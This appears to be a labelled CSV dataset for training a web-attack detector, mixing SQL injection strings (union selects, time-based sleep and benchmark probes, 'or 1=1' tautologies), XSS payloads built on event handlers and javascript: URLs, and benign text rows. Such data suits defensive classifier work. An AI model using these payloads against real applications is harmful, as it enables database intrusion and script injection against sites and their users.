Payload,Label,text_label,ID
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,21335
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,10972
"<marquee onbeforecut=""alert(1)"" contenteditable>te",1,XSS,1838
select * from users where id = 1 *1 union select 1,2,SQLi,11451
"<cite onkeyup=""alert(1)"" contenteditable>test</cit",1,XSS,1798
1'+ ( select tnch where 1867 = 1867 or char ( 117 ,2,SQLi,21621
"<a href=""\x20javascript:javascript:alert(1)"" id=""f",1,XSS,506
select sleep ( 5 ) and ( ( ( 5552 = 5552,2,SQLi,15078
<i id=x tabindex=1 onfocus=alert(1)></i>,1,XSS,5752
"<video onkeypress=""alert(1)"" contenteditable>test<",1,XSS,7588
-4610' ) ) or 4144 = ( select upper ( xmltype ( ch,2,SQLi,20356
"-7008' ) ) union all select 9080,9080,9080#",2,SQLi,19472
"<sub onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,3222
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,12270
"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,",2,SQLi,14016
"<strike draggable=""true"" ondragend=""alert(1)"">test",1,XSS,7887
"{""id"":null,""firstName"":""Ng"",""lastName"":""Hui"",""spec",0,normal,27287
"<body onmouseleave=""alert(1)"">test</body>",1,XSS,6598
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=ja",1,XSS,994
<style>:target {transform: rotate(180deg);}</style,1,XSS,4522
1'+ ( select 'sppw' where 1677 = 1677 and exp ( ~ ,2,SQLi,14848
"-8734%"" ) or 4493 = utl_inaddr.get_host_address ( ",2,SQLi,18851
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--",2,SQLi,10653
"To view a larger version of an image, simply selec",0,normal,25249
"<a href=""\xE2\x80\x81javascript:javascript:alert(1",1,XSS,514
"{""id"":null,""name"":""Binturong""}",0,normal,27039
or 1=1 /*,2,SQLi,10178
<footer onpointermove=alert(1)>XSS</footer>,1,XSS,4416
"<dialog onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,5424
-2806' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 1,2,SQLi,15791
<i onpointerup=alert(1)>XSS</i>,1,XSS,3379
"<marquee onbeforepaste=""alert(1)"" contenteditable>",1,XSS,8866
"<html ondblclick=""alert(1)"">test</html>",1,XSS,5818
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) a,2,SQLi,13829
"{""id"":null,""firstName"":""Manie"",""lastName"":""Villar""",0,normal,27522
"select * from users where id = 1 or 1#""? = 1 or 1 ",2,SQLi,11396
1' ) as imgv where 7802 = 7802,2,SQLi,17282
<button onPaste=javascript:alert(1)>,1,XSS,9645
Specify criteria where necessary.,0,normal,23476
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,2,SQLi,17513
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10711
-2960' or 2163 = 3143--,2,SQLi,14611
-9178' ) or 9779 = 6351,2,SQLi,18816
1' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113,2,SQLi,13132
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10666
"&#00;</form><input type&#61;""date"" onfocus=""alert(",1,XSS,857
"{""id"":null,""name"":""Coredramon (Blue)""}",0,normal,26926
"-8735' ) ) union all select 3262,3262,3262--",2,SQLi,18417
"<noframes onmouseenter=""alert(1)"">test</noframes>",1,XSS,4453
"<time onpaste=""alert(1)"" contenteditable>test</tim",1,XSS,5213
Select surprise.,0,normal,24729
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5430
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10648
"<style>@keyframes x{}</style><code style=""animatio",1,XSS,5956
"1"" ) ) as krro where 1050 = 1050 procedure analyse",2,SQLi,13172
"In 1845, however, a statute based on the recommend",0,normal,26021
"<output onpaste=""alert(1)"" contenteditable>test</o",1,XSS,8776
"-2602' union all select 5715,5715,5715,5715,5715,5",2,SQLi,16301
"x' AND email IS NULL, --",2,SQLi,11781
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomb",2,SQLi,21312
-1087 ) where 5787 = 5787 union all select 5787#,2,SQLi,16118
<input4 onpointerout=alert(1)>XSS</input4>,1,XSS,6052
1' ) where 6274 = 6274 or 8156 = ( select count ( ,2,SQLi,19018
select,0,normal,26554
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3004
<marquee/onstart=alert()>,1,XSS,1150
"and (select substring(@@version,1,1))='X'",2,SQLi,10342
-4972' ) ) as kfzc where 8817 = 8817 union all sel,2,SQLi,16043
"<slot draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,5570
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7091
"-9504%"" ) ) or 8098 = 7472",2,SQLi,18016
"<frame onbeforecut=""alert(1)"" contenteditable>test",1,XSS,8870
Join the art class to explore your talent.,0,normal,22982
"Previously, you'd need to select each app one by o",0,normal,25763
"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( ",2,SQLi,12786
"{""id"":null,""firstName"":""Jessie"",""lastName"":""Lin"",""",0,normal,27545
<font id=x tabindex=1 ondeactivate=alert(1)></font,1,XSS,3159
select current_database();,2,SQLi,22501
"ABC<div style=""x:\xE2\x80\x85expression(javascript",1,XSS,483
"admin"") or ""1""=""1""/*",2,SQLi,9942
`'><script>\xE2\x80\x88javascript:alert(510)</scri,1,XSS,8982
1' ) ) as lxjs where 6503 = 6503 procedure analyse,2,SQLi,19508
Select the perfect attire for the occasion.,0,normal,24250
<style>:target {transform: rotate(180deg);}</style,1,XSS,3781
"<style>@keyframes x{}</style><table style=""animati",1,XSS,5439
Update your style.,0,normal,22821
1%' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ,2,SQLi,17091
"<sub onpaste=""alert(1)"" contenteditable>test</sub>",1,XSS,8800
1' ) and 5999 = 5879,2,SQLi,21162
Select the best lens for capturing beauty.,0,normal,24172
( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ),2,SQLi,12818
"<menuitem onbeforecopy=""alert(1)"" contenteditable>",1,XSS,3652
